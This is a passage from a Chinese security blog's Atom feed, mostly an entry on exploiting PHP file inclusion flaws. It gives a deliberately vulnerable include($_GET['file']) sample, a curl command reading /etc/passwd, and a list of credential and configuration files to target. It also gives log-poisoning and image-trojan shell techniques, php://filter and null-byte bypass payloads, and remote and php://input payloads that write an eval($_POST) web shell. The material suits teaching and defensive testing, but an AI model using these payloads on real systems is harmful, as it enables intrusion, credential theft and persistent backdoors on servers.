&lt;li&gt;php_strip_whitespace()，读取一个php文件并返回一个去掉注释和换行的文本，有意思的是，该函数可以去掉任意语言的注释，只要这个语言的注释风格与php相同并且在文件头加入&lt;code&gt;&amp;lt;?php&lt;/code&gt;就行可：&lt;br&gt;&lt;img src=&quot;/php-PHP中的危险函数和伪协议/1549526799636.png&quot; alt=&quot;1549526799636&quot;&gt;&lt;/li&gt;
&lt;li&gt;parse_ini_file()，只能读取ini文件&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://anemone.top/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞利用</title>
    <link href="http://anemone.top/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/"/>
    <id>http://anemone.top/php-文件包含利用/</id>
    <published>2019-02-07T07:02:13.000Z</published>
    <updated>2019-09-22T10:14:18.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>本地文件包含可以作为文件读取使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1/include.php?file=/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">...</span><br></pre></td></tr></table></figure><a id="more"></a><p>可读如下敏感文件：</p><ul><li>Windows:<ul><li>C:\boot.ini    //查看系统版本</li><li>C:\Windows\System32\inetsrv\MetaBase.xml    //IIS配置文件</li><li>C:\Windows\repair\sam        //存储系统初次安装的密码</li><li>C:\Program Files\mysql\my.ini         //Mysql配置</li><li>C:\Program Files\mysql\data\mysql\user.MYD    //Mysql root</li><li>C:\Windows\php.ini    //php配置信息</li><li>C:\Windows\my.ini        //Mysql配置信息</li></ul></li><li>Linux:<ul><li>~/.ssh/authorized_keys</li><li>/etc/passwd</li><li>/etc/my.cnf</li><li>/etc/httpd/conf/httpd.conf</li><li>/var/log/apache2/access.log</li><li>/var/log/httpd/access_log</li></ul></li></ul><h2 id="包含图片马GetShell"><a href="#包含图片马GetShell" class="headerlink" title="包含图片马GetShell"></a>包含图片马GetShell</h2><p>首先上传图片马img.gif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后包含图片马，后缀名无限制：</p><p><img src="/php-文件包含利用/1549593738249.png" alt="1549593738249"></p><h2 id="包含日志GetShell"><a href="#包含日志GetShell" class="headerlink" title="包含日志GetShell"></a>包含日志GetShell</h2><p>先访问<code>/include.php?file=&lt;?=&#96;ls&#96;?&gt;</code>，将命令写入日志。</p><p><img src="/php-文件包含利用/1549594868535.png" alt="1549594868535"></p><p>再包含日志GetShell：</p><p><img src="/php-文件包含利用/1549594747532.png" alt="1549594747532"></p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p><code>php://filter</code>可以用来结合base64读取php源代码，payload为：<code>php://filter/read=convert.base64-encode/resource=include.php</code></p><p><img src="/php-文件包含利用/1549595279613.png" alt="1549595279613"></p><h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><ul><li>%00截断<ul><li>?file=../../../etc/pwd%00</li></ul></li><li>路径长度阶段<ul><li>?file=../../../etc/pwd/././.[…]/././.</li><li>?file=../../../boot.ini/….[…]………</li></ul></li></ul><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>需要All_url_fopen=On(默认开启)和Allow_url_include=On(默认关闭)</p><h2 id="直接包含远程一句话"><a href="#直接包含远程一句话" class="headerlink" title="直接包含远程一句话"></a>直接包含远程一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include.php?file=http://127.0.0.2/a.txt</span><br></pre></td></tr></table></figure><p>a.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php @eval($_POST[xxx]); ?&gt;"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code>可以将post部分请求作为一个php的只读文件流</p><p><img src="/php-文件包含利用/1549596283877.png" alt="1549596283877"></p><p>生成一句话payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval($_POST['xxxser']);?&gt;"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>PHP文件包含漏洞，<a href="https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html" target="_blank" rel="noopener">https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html</a></li><li>文件包含漏洞，<a href="https://www.cnblogs.com/bmjoker/p/9035259.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9035259.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;本地文件包含&quot;&gt;&lt;a href=&quot;#本地文件包含&quot; class=&quot;headerlink&quot; title=&quot;本地文件包含&quot;&gt;&lt;/a&gt;本地文件包含&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]);&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h2&gt;&lt;p&gt;本地文件包含可以作为文件读取使用：&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ curl http://127.0.0.1/include.php?file=/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://anemone.top/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
  </entry>
  
</feed>
